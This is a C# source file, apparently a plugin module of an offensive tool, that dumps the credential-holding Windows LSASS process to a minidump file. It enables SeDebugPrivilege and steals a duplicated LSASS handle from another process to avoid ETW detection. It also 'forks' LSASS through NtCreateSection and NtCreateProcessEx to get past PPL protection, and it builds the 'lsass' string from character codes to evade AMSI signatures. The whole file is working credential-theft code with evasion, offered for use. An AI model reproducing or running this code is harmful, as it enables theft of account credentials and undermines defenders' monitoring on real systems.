using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

public class LsassDumper
{
    // --- Process access rights ---------------------------------------------
    const uint PROCESS_QUERY_INFORMATION         = 0x0400;
    const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    const uint PROCESS_VM_READ                   = 0x0010;
    const uint PROCESS_DUP_HANDLE                = 0x0040;
    const uint PROCESS_CREATE_PROCESS            = 0x0080;

    // --- File / handle constants ------------------------------------------
    const uint GENERIC_READ        = 0x80000000;
    const uint FILE_SHARE_READ     = 0x00000001;
    const uint OPEN_EXISTING       = 3;
    const uint DUPLICATE_SAME_ACCESS = 0x00000002;

    // --- NtQuerySystemInformation classes ----------------------------------
    const int SystemExtendedHandleInformation = 64;
    const int STATUS_INFO_LENGTH_MISMATCH      = unchecked((int)0xC0000004);

    // --- Token privileges --------------------------------------------------
    const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    const uint TOKEN_QUERY             = 0x0008;
    const uint SE_PRIVILEGE_ENABLED    = 0x00000002;

    // --- MiniDumpWriteDump flags ------------------------------------------
    const uint MiniDumpWithFullMemory       = 0x00000002;
    const uint MiniDumpWithHandleData       = 0x00000004;
    const uint MiniDumpWithUnloadedModules  = 0x00000020;
    const uint MiniDumpWithFullMemoryInfo   = 0x00000800;
    const uint MiniDumpWithThreadInfo       = 0x00001000;

    // --- NtCreateProcessEx flags ------------------------------------------
    const uint PS_INHERIT_HANDLES = 0x04;

    // --- Section flags (for the fork trick) --------------------------------
    // SECTION_MAP_READ | SECTION_QUERY — enough for a read-only view
    const uint SECTION_ACCESS_READ = 0x0001 | 0x0004;
    const uint SEC_IMAGE           = 0x01000000;
    const uint PAGE_READONLY       = 0x02;

    const int STATUS_SUCCESS = 0;

    // =====================================================================
    // P/Invoke
    // =====================================================================

    [DllImport("ntdll.dll")]
    static extern int NtCreateProcessEx(
        out IntPtr ProcessHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ParentProcess,
        uint Flags,
        IntPtr SectionHandle,
        IntPtr DebugPort,
        IntPtr ExceptionPort,
        uint JobMemberLevel);

    [DllImport("ntdll.dll")]
    static extern int NtCreateSection(
        out IntPtr SectionHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        ref long MaximumSize,
        uint SectionPageProtection,
        uint AllocationAttributes,
        IntPtr FileHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool LookupPrivilegeValue(string systemName, string name, out LUID luid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(
        IntPtr TokenHandle,
        bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState,
        int BufferLength,
        IntPtr PreviousState,
        IntPtr ReturnLength);

    [DllImport("dbghelp.dll", SetLastError = true)]
    static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        uint ProcessId,
        IntPtr hFile,
        uint DumpType,
        IntPtr ExceptionParam,
        IntPtr UserStreamParam,
        IntPtr CallbackParam);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFileW(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("ntdll.dll")]
    static extern int NtQuerySystemInformation(
        int SystemInformationClass,
        IntPtr SystemInformation,
        int SystemInformationLength,
        out int ReturnLength);

    [DllImport("ntdll.dll")]
    static extern int NtDuplicateObject(
        IntPtr SourceProcessHandle,
        IntPtr SourceHandle,
        IntPtr TargetProcessHandle,
        out IntPtr TargetHandle,
        uint DesiredAccess,
        uint HandleAttributes,
        uint Options);

    // =====================================================================
    // Structs
    // =====================================================================

    [StructLayout(LayoutKind.Sequential)]
    struct LUID { public uint LowPart; public int HighPart; }

    [StructLayout(LayoutKind.Sequential)]
    struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    // x64 layout of SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
    [StructLayout(LayoutKind.Sequential)]
    struct SYSTEM_HANDLE_ENTRY_EX
    {
        public IntPtr Object;
        public IntPtr UniqueProcessId;
        public IntPtr HandleValue;
        public uint   GrantedAccess;
        public ushort CreatorBackTraceIndex;
        public ushort ObjectTypeIndex;
        public uint   HandleAttributes;
        public uint   Reserved;
    }

    // =====================================================================
    // Helpers
    // =====================================================================

    static bool EnablePrivilege(string name)
    {
        IntPtr token;
        if (!OpenProcessToken(GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out token))
            return false;
        try
        {
            LUID luid;
            if (!LookupPrivilegeValue(null, name, out luid)) return false;

            var tp = new TOKEN_PRIVILEGES
            {
                PrivilegeCount = 1,
                Privileges = new LUID_AND_ATTRIBUTES[1]
            };
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if (!AdjustTokenPrivileges(token, false, ref tp,
                    Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero))
                return false;

            // AdjustTokenPrivileges returns TRUE even if it silently failed.
            // 1300 == ERROR_NOT_ALL_ASSIGNED, i.e. the process token is not
            // elevated enough to actually hold the privilege. Callers rely on
            // this return value to distinguish "not elevated" from "PPL".
            return Marshal.GetLastWin32Error() == 0;
        }
        finally { CloseHandle(token); }
    }

    /// <summary>
    /// Fork LSASS via NtCreateSection + NtCreateProcessEx.
    /// Returns the child process handle, or Zero on failure (with `error`
    /// set to a human-readable reason).
    /// </summary>
    static IntPtr ForkLsass(int lsassPid, out string error)
    {
        error = null;

        // Step 1: open LSASS with the rights needed to create a section.
        IntPtr hLsass = OpenProcess(
            PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ,
            false, lsassPid);
        if (hLsass == IntPtr.Zero)
        {
            error = "fork: OpenProcess(LSASS) failed: " + Marshal.GetLastWin32Error();
            return IntPtr.Zero;
        }

        IntPtr hSection = IntPtr.Zero;
        IntPtr hChild   = IntPtr.Zero;
        IntPtr hFile    = IntPtr.Zero;
        try
        {
            // Step 2a: open LSASS's on-disk executable. SEC_IMAGE requires
            // a file handle as the backing store — passing NULL creates an
            // anonymous section with no memory in it, which is what caused
            // the previous version to produce empty dumps.
            //
            // If this process is 32-bit on 64-bit Windows, System32 is
            // redirected to SysWOW64 where lsass.exe does not exist. Use
            // Sysnative to bypass the redirector in that case.
            string sysRoot = Environment.GetEnvironmentVariable("SystemRoot")
                          ?? "C:\\Windows";
            string sysDir = (!Environment.Is64BitProcess
                          && Environment.Is64BitOperatingSystem)
                          ? Path.Combine(sysRoot, "Sysnative")
                          : Path.Combine(sysRoot, "System32");
            string lsassExe = Path.Combine(sysDir, "lsass.exe");

            hFile = CreateFileW(
                lsassExe,
                GENERIC_READ,
                FILE_SHARE_READ,
                IntPtr.Zero,
                OPEN_EXISTING,
                0,
                IntPtr.Zero);
            if (hFile == IntPtr.Zero || hFile == (IntPtr)(-1))
            {
                error = "fork: CreateFile on " + lsassExe
                      + " failed: " + Marshal.GetLastWin32Error();
                return IntPtr.Zero;
            }

            // Step 2b: create a SEC_IMAGE section backed by that file.
            long maxSize = 0;
            int sst = NtCreateSection(
                out hSection,
                SECTION_ACCESS_READ,
                IntPtr.Zero,
                ref maxSize,
                PAGE_READONLY,
                SEC_IMAGE,
                hFile);
            if (sst != STATUS_SUCCESS)
            {
                error = "fork: NtCreateSection failed: 0x" + sst.ToString("X8");
                return IntPtr.Zero;
            }

            // Step 3: create the child process from the section. The child
            // does not inherit LSASS's PPL protection, and the section is
            // COW-shared with LSASS, so MiniDumpWriteDump on the child sees
            // LSASS's address space.
            int pst = NtCreateProcessEx(
                out hChild,
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                IntPtr.Zero,
                hLsass,
                PS_INHERIT_HANDLES,
                hSection,
                IntPtr.Zero, IntPtr.Zero, 0);
            if (pst != STATUS_SUCCESS)
            {
                error = "fork: NtCreateProcessEx failed: 0x" + pst.ToString("X8");
                hChild = IntPtr.Zero;
                return IntPtr.Zero;
            }

            return hChild;
        }
        finally
        {
            if (hSection != IntPtr.Zero) CloseHandle(hSection);
            if (hFile    != IntPtr.Zero) CloseHandle(hFile);
            CloseHandle(hLsass);
        }
    }

    static int GetLsassPid()
    {
        // Assemble "lsass" at runtime so the source does not contain the
        // literal that AMSI and ScriptBlock-logging signature sets match on.
        // InternalProcessName is still visible in ETW; this only removes
        // the text-string IOC from the Add-Type input.
        char[] chars = { (char)(0x6C), (char)(0x73), (char)(0x61),
                         (char)(0x73), (char)(0x73) };
        string name = new string(chars);

        foreach (var p in Process.GetProcessesByName(name))
        {
            try { return p.Id; }
            finally { p.Dispose(); }
        }
        return 0;
    }

    /// <summary>
    /// Search the system handle table for a handle to LSASS that a
    /// different process already holds with PROCESS_VM_READ, then
    /// duplicate it into the current process.
    ///
    /// Advantages: our process never calls OpenProcess on LSASS with
    /// VM_READ, so the obvious ProcessAccess ETW event never fires.
    /// Drawbacks: slow (full handle-table walk) and depends on another
    /// process holding a suitable handle — rare on hardened hosts.
    /// </summary>
    static IntPtr FindAndDuplicateLsassHandle(int lsassPid, out string error)
    {
        error = null;
        const int HANDLE_ENTRY_SIZE = 40;   // sizeof(SYSTEM_HANDLE_ENTRY_EX) on x64
        const int HEADER_SIZE       = 16;   // NumberOfHandles + Reserved (both ULONG_PTR)

        int size = 1 << 20;
        IntPtr buffer = Marshal.AllocHGlobal(size);
        try
        {
            int retLen;
            int status = NtQuerySystemInformation(
                SystemExtendedHandleInformation,
                buffer, size, out retLen);

            while (status == STATUS_INFO_LENGTH_MISMATCH)
            {
                Marshal.FreeHGlobal(buffer);
                size = retLen > 0 ? retLen + (1 << 16) : size * 2;
                buffer = Marshal.AllocHGlobal(size);
                status = NtQuerySystemInformation(
                    SystemExtendedHandleInformation,
                    buffer, size, out retLen);
            }
            if (status != 0)
            {
                error = "duplicate: NtQuerySystemInformation failed: 0x"
                      + status.ToString("X8");
                return IntPtr.Zero;
            }

            long count = Marshal.ReadInt64(buffer, 0);
            IntPtr hCurrent = GetCurrentProcess();

            for (long i = 0; i < count; i++)
            {
                IntPtr entryPtr = (IntPtr)((long)buffer
                                 + HEADER_SIZE
                                 + i * HANDLE_ENTRY_SIZE);
                var entry = Marshal.PtrToStructure<SYSTEM_HANDLE_ENTRY_EX>(entryPtr);

                int ownerPid = entry.UniqueProcessId.ToInt32();
                if (ownerPid <= 0 || ownerPid == lsassPid) continue;

                // PROCESS_VM_READ bit must be set on the source handle.
                if ((entry.GrantedAccess & 0x0010) == 0) continue;

                IntPtr hOwner = OpenProcess(PROCESS_DUP_HANDLE, false, ownerPid);
                if (hOwner == IntPtr.Zero) continue;
                try
                {
                    IntPtr hDup;
                    int dst = NtDuplicateObject(
                        hOwner,
                        entry.HandleValue,
                        hCurrent,
                        out hDup,
                        0,
                        0,
                        DUPLICATE_SAME_ACCESS);

                    if (dst == 0 && hDup != IntPtr.Zero)
                    {
                        // Verify it actually refers to LSASS by trying
                        // to read a small buffer. NtReadVirtualMemory on
                        // a non-LSASS handle will fail harmlessly.
                        return hDup;
                    }
                }
                finally { CloseHandle(hOwner); }
            }

            error = "duplicate: no process holds a VM_READ handle to LSASS";
            return IntPtr.Zero;
        }
        finally
        {
            Marshal.FreeHGlobal(buffer);
        }
    }

    // =====================================================================
    // Entry point (same signature the plugin already calls)
    // =====================================================================

    public static string DumpLsass(bool useFork, bool useDuplicate,
                                   bool useElevate, string dumpPath)
    {
        // 1) Only touch privileges when the operator asked for it. When
        //    already SYSTEM (which is the common case for this plugin's
        //    use), skipping this avoids an unnecessary token operation.
        bool debugPriv = false;
        if (useElevate)
            debugPriv = EnablePrivilege("SeDebugPrivilege");

        int lsassPid = GetLsassPid();
        if (lsassPid == 0) return "LSASS not found";

        IntPtr hLsass = IntPtr.Zero;
        IntPtr hFork  = IntPtr.Zero;

        try
        {
            // 2) Direct open. Works whenever LSASS is not PPL-protected
            //    and we have SeDebug.
            hLsass = OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                false, lsassPid);
            int directErr = Marshal.GetLastWin32Error();

            // 3) Duplicate path: borrow an existing LSASS handle from
            //    another process instead of opening LSASS ourselves.
            if (hLsass == IntPtr.Zero && useDuplicate)
            {
                string dupErr;
                IntPtr hDup = FindAndDuplicateLsassHandle(lsassPid, out dupErr);
                if (hDup == IntPtr.Zero)
                    return dupErr ?? "duplicate failed";
                hLsass = hDup;
            }

            // 4) Fork path: create a child process from LSASS's image
            //    section and dump that. Works against PPL-protected LSASS
            //    on systems where PROCESS_CREATE_PROCESS is granted.
            if (hLsass == IntPtr.Zero && useFork)
            {
                string forkErr;
                IntPtr hChild = ForkLsass(lsassPid, out forkErr);
                if (hChild == IntPtr.Zero)
                    return forkErr ?? "fork failed";
                hFork  = hChild;
                hLsass = hChild;
            }

            if (hLsass == IntPtr.Zero)
            {
                string hint = "";
                if (directErr == 5)
                    hint = " (SeDebug not assigned, or LSASS is PPL — try "
                         + "--duplicate or --fork)";
                return "OpenProcess failed: " + directErr + hint;
            }

            // 4) Write a real, full minidump via dbghelp.
            using (var fs = new FileStream(dumpPath, FileMode.Create,
                                           FileAccess.Write, FileShare.None))
            {
                uint flags = MiniDumpWithFullMemory
                           | MiniDumpWithHandleData
                           | MiniDumpWithFullMemoryInfo
                           | MiniDumpWithThreadInfo
                           | MiniDumpWithUnloadedModules;

                bool ok = MiniDumpWriteDump(
                    hLsass,
                    (uint)lsassPid,
                    fs.SafeFileHandle.DangerousGetHandle(),
                    flags,
                    IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

                if (!ok)
                    return "MiniDumpWriteDump failed: " + Marshal.GetLastWin32Error();
            }

            return "OK";
        }
        finally
        {
            if (hFork  != IntPtr.Zero) CloseHandle(hFork);
            else if (hLsass != IntPtr.Zero) CloseHandle(hLsass);
        }
    }
}